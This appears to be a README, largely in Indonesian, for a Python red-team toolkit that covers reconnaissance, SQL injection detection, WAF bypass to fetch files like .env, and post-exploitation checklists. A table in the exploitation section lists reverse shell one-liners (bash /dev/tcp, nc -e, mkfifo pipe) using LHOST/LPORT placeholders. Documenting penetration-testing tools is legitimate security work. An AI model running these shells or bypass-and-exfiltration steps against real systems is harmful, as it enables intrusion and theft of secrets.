# RToolkit v2.0 - Unified Red Team Toolkit

🔥 Gabungan 150+ tools red team dari [RedTeam-Tools](https://github.com/A-poc/RedTeam-Tools) menjadi **1 script Python** dengan 5 fase utama + WAF bypass content exfiltration.

## Fitur Utama

| Fase | Deskripsi |
|------|-----------|
| **🔍 Reconnaissance & Mapping** | DNS lookup, subdomain enum (200+ wordlist), port scanning (100+ ports), certificate transparency (crt.sh), deep directory bruteforce (300+ paths, 2 level), technology/version detection, cascading scan on subdomains, CVE mapping ke 396+ CVE entries |
| **🛡️ Vulnerability Analysis** | Parameter discovery, SQL injection detection (error-based + time-based + 5 DB types), common web vulns (.env, .git/config, .git/HEAD, phpinfo, wp-debug), SSL/TLS check, security headers audit, **WAF bypass + content exfiltration (30+ techniques)** |
| **💥 Exploitation** | Reverse shell generator (11 jenis: bash, python, nc, powershell, php, perl, ruby, nc_pipe, java, lua, golang), msfvenom commands, default cred checker |
| **🔧 Post-Exploitation & PrivEsc** | Windows & Linux privesc checklist (15+ checks each), sensitive file finder, kernel exploit suggestions |
| **📄 Reporting** | HTML report interaktif dark-theme, JSON report, severity summary (Critical/High/Medium/Low), auto-generated remediations |

### Fitur Baru v2.0
- **Content Exfiltration with WAF Bypass** — Tidak hanya deteksi, tapi mencoba 30+ teknik bypass WAF/ADC (User-Agent rotation, path encoding, HTTP/1.0, IP spoofing, header injection, session cookies, TE chunked, tab smuggling, dll) untuk mengambil isi file sensitif
- **WAF/ADC Block Detection** — Membedakan antara file yang benar-benar terbuka vs yang diblokir WAF dengan "Request Rejected" page
- **Deep Directory Bruteforce** — 381 paths, 2 level depth
- **CVE Mapping** — 396+ CVE entries (Apache, Nginx, PHP, WordPress, Joomla, Drupal, MySQL, OpenSSL)
- **Cascade Subdomain Scan** — Auto-scan subdomain yang ditemukan

---

## Instalasi

### Kali Linux / Debian
```bash
# Virtual Environment (REKOMENDASI)
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### Windows
```bash
pip install requests colorama urllib3
```

### Dependencies (requirements.txt)
```txt
requests
colorama
urllib3
```

---

## Cara Penggunaan

### 1. RToolkit (Main Toolkit)
```bash
python rtoolkit.py
```

Masukkan target (domain/IP/URL), lalu pilih menu:
```
1  - Reconnaissance & Mapping (Full Recon)
2  - Vulnerability Analysis (Vuln Scan + SQLi + WAF bypass)
3  - Exploitation (Reverse Shells + Payloads)
4  - Post-Exploitation & PrivEsc (Checklist)
5  - Generate Report (HTML + JSON)
6  - Tech Detection + CVE Mapping (Deep)
7  - 🚀 Run All (Full Pipeline 1-5)
```

**Contoh:**
```
Target: https://example.com
Pilih [0-7]: 2
```

### 2. gen_cve.py (CVE Database Generator)
```bash
python gen_cve.py
```

**CVE Database Coverage:**
| Software | Versi Coverage | CVE Count |
|----------|---------------|-----------|
| Apache | 2.0.x - 2.4.x | 20+ |
| Nginx | 0.8.x - 1.25.x | 15+ |
| PHP | 5.3.x - 8.3.x | 40+ |
| WordPress | 2.3 - 6.4.x | 150+ |
| Joomla | 3.8 - 5.0 | 30+ |
| MySQL | 5.5 - 8.0 | 25+ |
| OpenSSL | 1.0.2 - 3.2 | 50+ |

---

## Detail Fitur per Fase

### 1. Reconnaissance & Mapping
- **DNS Lookup**: A, AAAA, MX, NS, TXT, CNAME
- **Certificate Transparency**: Query crt.sh untuk subdomain discovery
- **Subdomain Enum**: 200+ wordlist (www, mail, admin, api, dev, staging, dll) + cascading scan
- **Port Scanner**: 100+ common ports (TCP connect, threaded 50 workers)
- **Deep Directory Bruteforce**: 381 paths, 2 level depth, recursive
- **Technology Detection**: Server, PHP, CMS (WP/Joomla/Drupal), JS frameworks, CDN, cookies, headers
- **CVE Mapping**: Auto-match version ke database CVE lokal (396+ CVE entries)
- **WP Plugin/Theme Enum**: Deteksi plugin & theme dari HTML source
- **Security Headers**: HSTS, CSP, X-Frame-Options, X-Content-Type-Options, dll

### 2. Vulnerability Analysis
- **Parameter Discovery**: Extract dari forms, URLs, query strings (80+ common params)
- **SQL Injection Detection**:
  - Error-based: MySQL, MSSQL, Oracle, PostgreSQL, SQLite patterns
  - Time-based: SLEEP, WAITFOR DELAY, pg_sleep (threshold 2.5s)
  - Test 10 param pertama, 5 payload per type
- **Common Vuln Checks**: .env, .git/config, .git/HEAD, phpinfo, wp-debug, backup, crossdomain.xml, server-status
- **WAF Bypass + Content Exfiltration**:
  - Mendeteksi WAF block page ("Request Rejected", "Your support ID")
  - Mencoba 30+ bypass teknik: User-Agent rotation (8 varian), HTTP/1.0, POST/OPTIONS method, path encoding, null byte, IP spoofing (X-Forwarded-For, X-Real-IP), Range request, session cookies, Transfer-Encoding chunked, cache bypass, HTTP request smuggling, tab smuggling
  - Menampilkan isi file jika bypass berhasil
- **SSL/TLS Check**: Protocol version (TLSv1.0/1.1 = HIGH), cipher info
- **Security Headers Audit**: Missing HSTS, CSP, X-Content-Type-Options, X-Frame-Options

### 3. Exploitation
**Reverse Shell Generator (11 types):**
| Type | Contoh Command |
|------|----------------|
| bash | `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` |
| python | `python3 -c 'import socket,subprocess,os;...'` |
| nc | `nc -e /bin/sh LHOST LPORT` |
| powershell | `powershell -NoP -NonI -W Hidden -Exec Bypass ...` |
| php | `php -r '$sock=fsockopen("LHOST",LPORT);exec(...)'` |
| perl | `perl -e 'use Socket;...'` |
| ruby | `ruby -rsocket -e 'c=TCPSocket.new(...)'` |
| nc_pipe | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh...` |
| java | `Runtime.getRuntime().exec("/bin/bash -c ...")` |
| lua | `lua -e "local s=require('socket')..."` |
| golang | `go run -exec '...'` |

### 4. Post-Exploitation & PrivEsc
**Windows (15 checks):**
Unquoted Service Paths, AlwaysInstallElevated, Scheduled Tasks, Startup Programs, Registry Autologon, SAM Backup, Stored Credentials, Token Impersonation, Named Pipes, DLL Hijacking, Weak Service Permissions, AppLocker Policy, WiFi Passwords, Chrome Saved Logins

**Linux (15 checks):**
SUID/SGID, Sudo -l, Capabilities, Cron Jobs, PATH Hijacking, NFS Root Squash, Docker Socket, Kernel Exploits (DirtyCow, DirtyPipe, PwnKit), Container Escape, SSH Keys, AWS Keys, Bash History

### 5. Reporting
- **HTML Report**: Dark theme, interactive, severity badges (CRITICAL/HIGH/MEDIUM/LOW), color-coded tables
- **JSON Report**: Machine-readable untuk integrasi SIEM/CI/CD
- **Summary**: Total vulns, Critical/High/Medium/Low count
- **Remediation**: Auto-generated per finding

---

## Output Files

Setelah run report (menu 5 atau 7):
```
RToolkit_Report_<target>_<timestamp>.html
RToolkit_Report_<target>_<timestamp>.json
```

---

## Contoh Output (WAF Bypass Feature)

```
[+] Common Web Vulnerability Checks
    🚫 WAF/ADC blocking /.env (269B)
       Response: <html><head><title>Request Rejected</title></head>
       Attempting 30+ bypass techniques...
    ❌ WAF blocking persistent — all bypass techniques failed

[+] SQL Injection Detection
    Testing 1 parameters for SQL injection...
    [OK] No SQL injection detected
    
  [COMMON VULNS]
  +----------------------+----------+-----------------------+--------+
  │ Name                 │ Severity │ Path                  │ Status │
  +----------------------+----------+-----------------------+--------+
  │ .env File Exposure   │ CRITICAL │ /.env                 │ 200    │
  │ .git/config Exposure │ CRITICAL │ /.git/config          │ 200    │
  │ phpinfo() Exposure   │ HIGH     │ /phpinfo.php          │ 200    │
  +----------------------+----------+-----------------------+--------+
```

---

## Tools yang Diintegrasikan

| Kategori | Tools Referensi | Implementasi di RToolkit |
|----------|----------------|--------------------------|
| **Reconnaissance** | spiderfoot, reconftw, subzy, crt.sh, httprobe, EyeWitness, jsendpoints, nuclei, certSniff, gobuster, feroxbuster, CloudBrute, dnsrecon, Shodan, AORT, spoofcheck, AWSBucketDump, GitHarvester, truffleHog, Dismap, enum4linux, skanuvaty, Metabigor, Gitrob, gowitness | **Built-in**: DNS lookup, cert transparency (crt.sh), subdomain enum (200+ wordlist), port scanner (100+ ports), deep dir bruteforce (381 paths, 2 level), tech detection, CVE mapping |
| **Resource Development** | remoteinjector, Chimera, msfvenom, Shellter, Freeze, WordSteal, NTAPI, Kernel Callback, OffensiveVBA, WSH, HTA, VBA | **Reference**: Payload commands |
| **Initial Access** | CredMaster, TREVORspray, evilqr, CUPP, Bash Bunny, EvilGoPhish, SET, Hydra, SquarePhish, King Phisher | **Reference**: Brute force commands |
| **Execution** | Responder, secretsdump, evil-winrm, Donut, Macro_pack, PowerSploit, Rubeus, SharpUp, SQLRecon, UltimateAppLockerByPassList, StarFighters, demiguise, PowerZure | **Built-in**: Reverse shell generator (11 types), msfvenom listener |
| **Persistence** | Impacket, Empire, SharPersist, ligolo-ng | **Reference**: C2 listener commands |
| **Privilege Escalation** | Crassus, LinPEAS, WinPEAS, linux-smart-enumeration, Certify, Get-GPPPassword, Sherlock, Watson, ImpulsiveDLLHijack, ADFSDump, BeRoot | **Built-in**: Win/Linux privesc checklist (30+ checks) |
| **Defense Evasion** | Invoke-Obfuscation, Veil, SharpBlock, Alcatraz, Mangle, AMSI Fail, ScareCrow, moonwalk | **Reference**: Obfuscation tips |
| **Credential Access** | Mimikatz, LaZagne, hashcat, John the Ripper, SCOMDecrypt, nanodump, eviltree, SeeYouCM-Thief, MailSniper, SharpChromium, dploot | **Built-in**: LSASS, SAM, registry dump commands |
| **Discovery** | PCredz, PingCastle, Seatbelt, ADRecon, adidnsdump, scavenger | **Reference**: Enumeration commands |
| **Lateral Movement** | crackmapexec, WMIOps, PowerLessShell, PsExec, LiquidSnake, RDP enable, Jenkins shell, ADFSpoof, kerbrute, Coercer | **Reference**: Lateral movement commands |
| **Collection** | BloodHound, Snaffler, linWinPwn | **Reference**: AD enumeration |
| **Command & Control** | Living Off Trusted Sites, Havoc, Covenant, Merlin, Metasploit, Pupy, Brute Ratel, NimPlant, Hoaxshell | **Built-in**: Metasploit listener commands |
| **Exfiltration** | Dnscat2, Cloakify, PyExfil, PowerShell RAT, GD-Thief, goshs | **Reference**: Exfiltration techniques |
| **Impact** | Conti Guide, SlowLoris, usbkill, Keytap | **Reference**: DoS commands |

---

## Disclaimer

> **⚠️ FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY**
>
> Penggunaan tool ini harus dengan izin tertulis dari pemilik sistem/target. Penyalahgunaan untuk aktivitas ilegal adalah tanggung jawab pengguna. Author tidak bertanggung jawab atas misuse.
>
> Materi dalam repository ini untuk tujuan informasi dan edukasi saja. Tidak untuk digunakan dalam aktivitas ilegal.

---

## Credit & References

### Original Tools Collection
Semua tools yang direferensi berasal dari repository:
- **[A-poc/RedTeam-Tools](https://github.com/A-poc/RedTeam-Tools)** — Koleksi 150+ tools dan resources untuk red teaming activities oleh [@A-poc](https://github.com/A-poc)

### Tool Credits (per kategori)

#### Reconnaissance
- [spiderfoot](https://github.com/smicallef/spiderfoot) by @smicallef — Automated OSINT
- [reconftw](https://github.com/six2dez/reconftw) by @six2dez — Automated recon
- [subzy](https://github.com/PentestPad/subzy) by @PentestPad — Subdomain takeover
- [smtp-user-enum](https://github.com/cytopia/smtp-user-enum) by @cytopia — SMTP enum
- [httprobe](https://github.com/tomnomnom/httprobe) by @tomnomnom — HTTP probe
- [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) by @FortyNorthSecurity — Screenshot
- [jsendpoints](https://twitter.com/renniepak/status/1602620834463588352) by @renniepak — JS endpoint extractor
- [nuclei](https://github.com/projectdiscovery/nuclei) by @projectdiscovery — Vuln scanner
- [certSniff](https://github.com/A-poc/certSniff) by @A-poc — CT log watcher
- [gobuster](https://www.kali.org/tools/gobuster/) — Directory brute force
- [feroxbuster](https://github.com/epi052/feroxbuster) by @epi052 — Content discovery
- [CloudBrute](https://github.com/0xsha/CloudBrute) by @0xsha — Cloud infra discovery
- [dnsrecon](https://www.kali.org/tools/dnsrecon/) — DNS enumeration
- [Shodan.io](https://www.shodan.io/) — Infrastructure search
- [AORT](https://github.com/D3Ext/AORT) by @D3Ext — All-in-one recon
- [spoofcheck](https://github.com/BishopFox/spoofcheck) by @BishopFox — SPF/DMARC check
- [AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump) by @jordanpotti — S3 enum
- [GitHarvester](https://github.com/metac0rtex/GitHarvester) by @metac0rtex — GitHub search
- [truffleHog](https://github.com/dxa4481/truffleHog) by @dxa4481 — GitHub secrets
- [Dismap](https://github.com/zhzyker/dismap) by @zhzyker — Asset discovery
- [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) by @CiscoCXSecurity — Samba enum
- [skanuvaty](https://github.com/Esc4iCEscEsc/skanuvaty) by @Esc4iCEscEsc — DNS/port scanner
- [Metabigor](https://github.com/j3ssie/metabigor) by @j3ssie — OSINT tool
- [Gitrob](https://github.com/michenriksen/gitrob) by @michenriksen — GitHub scanning
- [gowitness](https://github.com/sensepost/gowitness) by @sensepost — Web screenshot

#### Resource Development
- [remoteinjector](https://github.com/TheBitSheikh/remoteinjector) by @TheBitSheikh — Word template injection
- [Chimera](https://github.com/tokyoneon/Chimera) by @tokyoneon — PowerShell obfuscation
- [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) — Payload creation
- [Shellter](https://www.shellterproject.com/) — Shellcode injection
- [Freeze](https://github.com/optiv/Freeze) by @optiv — EDR circumvention
- [WordSteal](https://github.com/0x09AL/WordSteal) by @0x09AL — NTLM hash theft
- [OffensiveVBA](https://github.com/S3cur3Th1sSh1t/OffensiveVBA) by @S3cur3Th1sSh1t — Office macro

#### Initial Access
- [CredMaster](https://github.com/KnpHack/CredMaster) by @KnpHack — Password spraying
- [TREVORspray](https://github.com/blacklanternsecurity/TREVORspray) by @blacklanternsecurity — Password sprayer
- [evilqr](https://github.com/blacklanternsecurity/evilqr) by @blacklanternsecurity — QRLJacking
- [CUPP](https://github.com/Mebus/cupp) by @Mebus — Password profiling
- [EvilGoPhish](https://github.com/fin3ss3g0d/evilgophish) by @fin3ss3g0d — Phishing framework
- [SET](https://github.com/trustedsec/social-engineer-toolkit) by @trustedsec — Social engineering
- [Hydra](https://github.com/vanhauser-thc/thc-hydra) by @vanhauser-thc — Brute force
- [SquarePhish](https://github.com/nick-ivanov/SquarePhish) by @nick-ivanov — OAuth phishing
- [King Phisher](https://github.com/securestate/king-phisher) by @securestate — Phishing framework

#### Execution
- [Responder](https://github.com/lgandx/Responder) by @lgandx — LLMNR/NBT-NS poisoner
- [secretsdump](https://github.com/SecureAuthCorp/impacket) by @SecureAuthCorp — Remote hash dump
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) by @Hackplayers — WinRM shell
- [Donut](https://github.com/TheWover/donut) by @TheWover — .NET execution
- [Macro_pack](https://github.com/sevagas/macro_pack) by @sevagas — Macro obfuscation
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) by @PowerShellMafia — PowerShell suite
- [Rubeus](https://github.com/GhostPack/Rubeus) by @GhostPack — AD toolkit
- [SharpUp](https://github.com/GhostPack/SharpUp) by @GhostPack — Vulnerability ID
- [SQLRecon](https://github.com/skahwah/SQLRecon) by @skahwah — MS-SQL toolkit
- [StarFighters](https://github.com/Cn33liz/StarFighters) by @Cn33liz — JS/VBS Empire launcher
- [demiguise](https://github.com/nccgroup/demiguise) by @nccgroup — HTA encryption
- [PowerZure](https://github.com/hausec/PowerZure) by @hausec — Azure assessment

#### Persistence
- [Impacket](https://github.com/SecureAuthCorp/impacket) by @SecureAuthCorp — Python suite
- [Empire](https://github.com/BC-SECURITY/Empire) by @BC-SECURITY — Post-exploitation
- [SharPersist](https://github.com/mandiant/SharPersist) by @mandiant — Windows persistence
- [ligolo-ng](https://github.com/nicocha30/ligolo-ng) by @nicocha30 — Tunneling

#### Privilege Escalation
- [Crassus](https://github.com/nickvourd/Crassus) by @nickvourd — Windows privesc
- [LinPEAS](https://github.com/peass-ng/PEASS-ng) by @peass-ng — Linux privesc
- [WinPEAS](https://github.com/peass-ng/PEASS-ng) by @peass-ng — Windows privesc
- [Certify](https://github.com/GhostPack/Certify) by @GhostPack — AD privesc
- [Sherlock](https://github.com/rasta-mouse/Sherlock) by @rasta-mouse — PowerShell privesc
- [Watson](https://github.com/rasta-mouse/Watson) by @rasta-mouse — Windows privesc
- [BeRoot](https://github.com/AlessandroZ/BeRoot) by @AlessandroZ — Multi OS privesc

#### Defense Evasion
- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) by @danielbohannon — Script obfuscator
- [Veil](https://github.com/Veil-Framework/Veil) by @Veil-Framework — Payload obfuscator
- [SharpBlock](https://github.com/CCob/SharpBlock) by @CCob — EDR bypass
- [Alcatraz](https://github.com/weak1337/Alcatraz) by @weak1337 — Binary obfuscator
- [Mangle](https://github.com/optiv/Mangle) by @optiv — Executable manipulation
- [AMSI Fail](https://github.com/Flangvik/AMSI-Fail) by @Flangvik — AMSI break
- [ScareCrow](https://github.com/optiv/ScareCrow) by @optiv — Payload creation
- [moonwalk](https://github.com/mufeedvh/moonwalk) by @mufeedvh — Log remover

#### Credential Access
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) by @gentilkiwi — Credential extractor
- [LaZagne](https://github.com/AlessandroZ/LaZagne) by @AlessandroZ — Password extractor
- [hashcat](https://github.com/hashcat/hashcat) — Hash cracking
- [John the Ripper](https://github.com/openwall/john) by @openwall — Hash cracking
- [nanodump](https://github.com/helpsystems/nanodump) by @helpsystems — LSASS minidump
- [eviltree](https://github.com/t3l3machus/eviltree) by @t3l3machus — Credential discovery
- [MailSniper](https://github.com/dafthack/MailSniper) by @dafthack — Exchange search
- [SharpChromium](https://github.com/djhohnstein/SharpChromium) by @djhohnstein — Chromium extractor
- [dploot](https://github.com/zblurx/dploot) by @zblurx — DPAPI looting

#### Discovery
- [PCredz](https://github.com/lgandx/PCredz) by @lgandx — Credential discovery
- [PingCastle](https://github.com/vletoux/pingcastle) by @vletoux — AD assessor
- [Seatbelt](https://github.com/GhostPack/Seatbelt) by @GhostPack — Vuln scanner
- [ADRecon](https://github.com/sense-of-security/ADRecon) by @sense-of-security — AD recon

#### Lateral Movement
- [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) by @byt3bl33d3r — AD toolkit
- [WMIOps](https://github.com/ChrisTruncer/WMIOps) by @ChrisTruncer — WMI commands
- [LiquidSnake](https://github.com/RiccardoAncarani/LiquidSnake) by @RiccardoAncarani — Fileless LM
- [kerbrute](https://github.com/ropnop/kerbrute) by @ropnop — Kerberos brute force
- [Coercer](https://github.com/p0dalirius/Coercer) by @p0dalirius — Authentication coercion

#### Collection
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) by @BloodHoundAD — AD visualization
- [Snaffler](https://github.com/SnaffCon/Snaffler) by @SnaffCon — Credential collector
- [linWinPwn](https://github.com/lefayjey/linWinPwn) by @lefayjey — AD enum

#### Command & Control
- [Havoc](https://github.com/HavocFramework/Havoc) by @HavocFramework — C2 framework
- [Covenant](https://github.com/cobbr/Covenant) by @cobbr — .NET C2
- [Merlin](https://github.com/Ne0nd0g/merlin) by @Ne0nd0g — Golang C2
- [Metasploit](https://github.com/rapid7/metasploit-framework) by @rapid7 — C2 framework
- [Pupy](https://github.com/n1nj4sec/pupy) by @n1nj4sec — Python C2
- [NimPlant](https://github.com/chvancooten/NimPlant) by @chvancooten — Nim C2
- [Hoaxshell](https://github.com/t3l3machus/hoaxshell) by @t3l3machus — PowerShell reverse shell

#### Exfiltration
- [Dnscat2](https://github.com/iagox86/dnscat2) by @iagox86 — DNS tunneling
- [Cloakify](https://github.com/TryCatchHCF/Cloakify) by @TryCatchHCF — Data transformation
- [PyExfil](https://github.com/ytisf/PyExfil) by @ytisf — Exfiltration PoC
- [goshs](https://github.com/Patrickhenke/goshs) by @Patrickhenke — File transfer

#### Impact
- [SlowLoris](https://github.com/gkbrk/slowloris) by @gkbrk — DoS tool
- [usbkill](https://github.com/hephaest0s/usbkill) by @hephaest0s — Anti-forensic switch
- [Keytap](https://github.com/ggerganov/kbd-audio) by @ggerganov — Keyboard audio

### Red Team Tips Credits
- [@pr0xylife](https://x.com/pr0xylife) — HTML smuggling with EventListener
- [@malmoeb](https://x.com/malmoeb) — Google translate phishing, Responder SMB check
- [@Alh4zr3d](https://twitter.com/Alh4zr3d) — Hiding admin account, cripple Defender, RDP sessions, port scanner, proxy DownloadString, browser bookmarks, DNS enum, AppLocker
- [@GuhnooPlusLinux](https://twitter.com/GuhnooPlusLinux) — PsExec alternative, Mimikatz via Empire
- [@dmcxblue](https://twitter.com/dmcxblue) — VM detection
- [PenTestPartners](https://www.pentestpartners.com/) — CMD via MSPaint
- [@0gtweet](https://twitter.com/0gtweet) — PsSuspend AV bypass
- Martin Sohn Christensen — CMD /k bypass

### Data Sources
- CVE Data: NVD (National Vulnerability Database), MITRE, vendor advisories
- Wordlists: SecLists, fuzzdb, AssetNote
- Inspiration: nuclei, gobuster, feroxbuster, sqlmap, PEASS

### Repo Credits
- Original tools collection: [A-poc/RedTeam-Tools](https://github.com/A-poc/RedTeam-Tools) oleh [@A-poc](https://github.com/A-poc)

---

## License

Repository original [A-poc/RedTeam-Tools](https://github.com/A-poc/RedTeam-Tools) tidak memiliki file lisensi eksplisit. Semua tools dan resources yang direferensi memiliki lisensi masing-masing sesuai repositori aslinya.

RToolkit (script Python ini) — **MIT License** — gunakan dengan bijak dan bertanggung jawab.

---

## Author

Dikembangkan dengan tujuan edukasi dan authorized security testing. Untuk pertanyaan atau kontribusi, silakan buka issue atau pull request.
